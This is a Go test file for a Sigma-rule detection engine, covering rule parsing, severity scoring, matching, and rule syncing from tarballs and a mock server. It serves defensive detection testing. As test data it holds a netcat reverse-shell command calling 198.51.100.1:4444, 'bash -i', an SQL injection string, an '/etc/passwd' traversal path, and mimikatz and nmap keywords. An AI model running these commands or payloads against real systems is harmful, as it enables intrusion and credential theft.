package rules

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"github.com/copsec/controller/pkg/models"
)

func TestSigmaSeverityNormalization(t *testing.T) {
	cases := []struct {
		level         string
		expectedScore int
		expectedSev   models.Severity
	}{
		{"critical", 95, models.SeverityCritical},
		{"CRITICAL", 95, models.SeverityCritical},
		{"high", 80, models.SeverityHigh},
		{"HIGH", 80, models.SeverityHigh},
		{"medium", 50, models.SeverityMedium},
		{"MEDIUM", 50, models.SeverityMedium},
		{"low", 20, models.SeverityLow},
		{"informational", 0, models.SeverityInfo},
		{"info", 0, models.SeverityInfo},
		{"unknown", 50, models.SeverityMedium},
	}

	for _, c := range cases {
		score, sev := NormalizeSigmaSeverity(c.level)
		if score != c.expectedScore || sev != c.expectedSev {
			t.Errorf("NormalizeSigmaSeverity(%s) = (%d, %s); want (%d, %s)",
				c.level, score, sev, c.expectedScore, c.expectedSev)
		}
	}
}

func TestSigmaRuleParsingAndMatching(t *testing.T) {
	yamlRule := `
title: Netcat Reverse Shell Execution
id: proc-nc-revshell
status: production
level: critical
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - "nc -e /bin/sh"
      - "ncat -e /bin/bash"
  filter:
    CommandLine|contains:
      - "test_ignore_string"
  condition: selection and not filter
`

	rule, err := ParseSigmaRule(yamlRule, "[SIGMAHQ]")
	if err != nil {
		t.Fatalf("ParseSigmaRule failed: %v", err)
	}

	if rule.ID != "proc-nc-revshell" {
		t.Errorf("ID mismatch: %s", rule.ID)
	}
	if rule.MitreTechniqueID != "T1059.004" {
		t.Errorf("MitreID mismatch: %s", rule.MitreTechniqueID)
	}
	if rule.ThreatScore != 95 {
		t.Errorf("ThreatScore mismatch: %d", rule.ThreatScore)
	}
	if rule.Severity != models.SeverityCritical {
		t.Errorf("Severity mismatch: %s", rule.Severity)
	}
	if rule.Origin != "[SIGMAHQ]" {
		t.Errorf("Origin mismatch: %s", rule.Origin)
	}

	// 1. Positive Match
	matchPositive := rule.EvaluateEvent("/bin/sh -c 'nc -e /bin/sh 198.51.100.1 4444'", map[string]string{
		"commandline": "nc -e /bin/sh 198.51.100.1 4444",
	})
	if !matchPositive {
		t.Errorf("Expected positive match for netcat revshell")
	}

	// 2. Filtered Match (Should not match due to filter)
	matchFiltered := rule.EvaluateEvent("nc -e /bin/sh test_ignore_string", map[string]string{
		"commandline": "nc -e /bin/sh test_ignore_string",
	})
	if matchFiltered {
		t.Errorf("Expected filter to suppress match")
	}

	// 3. Toggle Disable
	rule.Enabled = false
	if rule.EvaluateEvent("nc -e /bin/sh 1.2.3.4", map[string]string{"commandline": "nc -e /bin/sh"}) {
		t.Errorf("Disabled rule should not match")
	}
}

func TestMatcherRegistryAndBuiltinLoad(t *testing.T) {
	matcher := NewMatcher()
	matcher.LoadBuiltinRules()

	rules := matcher.ListRules()
	if len(rules) < 4 {
		t.Fatalf("Expected at least 4 builtin rules, got %d", len(rules))
	}

	// Check origin tag
	for _, r := range rules {
		if r.Origin != "[BUILTIN]" {
			t.Errorf("Expected [BUILTIN] origin, got %s for %s", r.Origin, r.ID)
		}
	}

	// Test Matcher.Evaluate on Web SQLi
	matchedRule, matched := matcher.Evaluate("GET /login?user=admin%20or%201=1 HTTP/1.1", map[string]string{
		"uri": "/login?user=admin or 1=1",
	})
	if !matched || matchedRule.ID != "sigma-web-sqli" {
		t.Errorf("Expected match on sigma-web-sqli, got matched=%v, rule=%+v", matched, matchedRule)
	}

	// Test Toggle
	success := matcher.SetRuleEnabled("sigma-web-sqli", false)
	if !success {
		t.Errorf("SetRuleEnabled failed")
	}

	_, matchedAfterDisable := matcher.Evaluate("GET /login?user=admin%20or%201=1 HTTP/1.1", map[string]string{
		"uri": "/login?user=admin or 1=1",
	})
	if matchedAfterDisable {
		t.Errorf("Disabled rule should not match in Matcher.Evaluate")
	}
}

func TestSyncerTarballStreamingAndDirectoryFiltering(t *testing.T) {
	tmpDir := t.TempDir()
	matcher := NewMatcher()
	syncer := NewSyncer("", tmpDir, matcher)

	// Create an in-memory gzipped tar archive with files across various directories
	var buf bytes.Buffer
	gzw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gzw)

	files := []struct {
		name    string
		content string
		allowed bool
	}{
		{
			name: "SigmaHQ-sigma-123/rules/linux/process_creation/proc_creation_lnx_revshell.yml",
			content: `
title: Linux Reverse Shell
id: sigma-linux-revshell-test
level: critical
tags:
  - attack.execution
  - attack.t1059.004
detection:
  selection:
    raw:
      - "bash -i"
  condition: selection
`,
			allowed: true,
		},
		{
			name: "SigmaHQ-sigma-123/rules/web/web_servers/web_cve_sqli.yml",
			content: `
title: Web Server SQL Injection
id: sigma-web-sqli-test
level: high
tags:
  - attack.initial_access
  - attack.t1190
detection:
  selection:
    raw:
      - "union select"
  condition: selection
`,
			allowed: true,
		},
		{
			name: "SigmaHQ-sigma-123/rules/linux/builtin/auth/auth_ssh_bruteforce.yml",
			content: `
title: SSH Auth Brute Force
id: sigma-auth-bruteforce-test
level: medium
tags:
  - attack.credential_access
  - attack.t1110.001
detection:
  selection:
    raw:
      - "Failed password"
  condition: selection
`,
			allowed: true,
		},
		{
			name: "SigmaHQ-sigma-123/rules/network/net_port_scan.yml",
			content: `
title: Network Port Scan
id: sigma-net-portscan-test
level: low
tags:
  - attack.reconnaissance
  - attack.t1046
detection:
  selection:
    raw:
      - "nmap"
  condition: selection
`,
			allowed: true,
		},
		{
			name: "SigmaHQ-sigma-123/rules/windows/process_creation/proc_win_mimikatz.yml",
			content: `
title: Windows Mimikatz Execution
id: sigma-win-mimikatz-ignored
level: critical
detection:
  selection:
    raw:
      - "mimikatz"
  condition: selection
`,
			allowed: false, // Windows process creation must be ignored by Linux CoPSeC core filter
		},
		{
			name: "SigmaHQ-sigma-123/rules/macos/mac_persistence.yml",
			content: `
title: MacOS Persistence
id: sigma-mac-ignored
level: high
detection:
  selection:
    raw:
      - "launchd"
  condition: selection
`,
			allowed: false, // MacOS rule must be filtered out
		},
	}

	for _, f := range files {
		data := []byte(f.content)
		hdr := &tar.Header{
			Name: f.name,
			Mode: 0640,
			Size: int64(len(data)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("WriteHeader failed: %v", err)
		}
		if _, err := tw.Write(data); err != nil {
			t.Fatalf("Write failed: %v", err)
		}
	}

	_ = tw.Close()
	_ = gzw.Close()

	// Process tar stream
	status, err := syncer.ProcessTarballStream(&buf)
	if err != nil {
		t.Fatalf("ProcessTarballStream failed: %v", err)
	}

	if status.SyncedCount != 4 {
		t.Errorf("Expected 4 allowed rules ingested, got %d", status.SyncedCount)
	}

	// Verify only the 4 allowed rules are in matcher
	if _, ok := matcher.GetRule("sigma-linux-revshell-test"); !ok {
		t.Errorf("Expected sigma-linux-revshell-test to be in matcher")
	}
	if _, ok := matcher.GetRule("sigma-web-sqli-test"); !ok {
		t.Errorf("Expected sigma-web-sqli-test to be in matcher")
	}
	if _, ok := matcher.GetRule("sigma-auth-bruteforce-test"); !ok {
		t.Errorf("Expected sigma-auth-bruteforce-test to be in matcher")
	}
	if _, ok := matcher.GetRule("sigma-net-portscan-test"); !ok {
		t.Errorf("Expected sigma-net-portscan-test to be in matcher")
	}

	// Disallowed rules must not be present
	if _, ok := matcher.GetRule("sigma-win-mimikatz-ignored"); ok {
		t.Errorf("Windows rule sigma-win-mimikatz-ignored must be filtered out")
	}
	if _, ok := matcher.GetRule("sigma-mac-ignored"); ok {
		t.Errorf("MacOS rule sigma-mac-ignored must be filtered out")
	}

	// Verify files written to disk
	entries, err := os.ReadDir(tmpDir)
	if err != nil || len(entries) == 0 {
		t.Errorf("Expected rules written to storage directory %s", tmpDir)
	}
}

func TestSyncerHTTPMockSync(t *testing.T) {
	tmpDir := t.TempDir()
	matcher := NewMatcher()

	// Mock GitHub Tarball HTTP Server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var buf bytes.Buffer
		gzw := gzip.NewWriter(&buf)
		tw := tar.NewWriter(gzw)

		data := []byte(`
title: Web Path Traversal Probe
id: sigma-web-lfi-test
level: high
tags:
  - attack.initial_access
  - attack.t1190
detection:
  selection:
    raw:
      - "../../../etc/passwd"
  condition: selection
`)
		hdr := &tar.Header{
			Name: "SigmaHQ-sigma/rules/web/web_servers/web_lfi.yml",
			Mode: 0640,
			Size: int64(len(data)),
		}
		_ = tw.WriteHeader(hdr)
		_, _ = tw.Write(data)
		_ = tw.Close()
		_ = gzw.Close()

		w.Header().Set("Content-Type", "application/x-gzip")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write(buf.Bytes())
	}))
	defer server.Close()

	syncer := NewSyncer(server.URL, filepath.Join(tmpDir, "rules"), matcher)

	status, err := syncer.Sync(context.Background())
	if err != nil {
		t.Fatalf("Sync failed: %v", err)
	}

	if status.Status != "SUCCESS" || status.SyncedCount != 1 {
		t.Errorf("Expected SUCCESS with 1 synced rule, got %+v", status)
	}

	rule, ok := matcher.GetRule("sigma-web-lfi-test")
	if !ok || rule.Origin != "[SIGMAHQ]" {
		t.Errorf("Expected sigma-web-lfi-test with [SIGMAHQ] origin, got %+v", rule)
	}
}
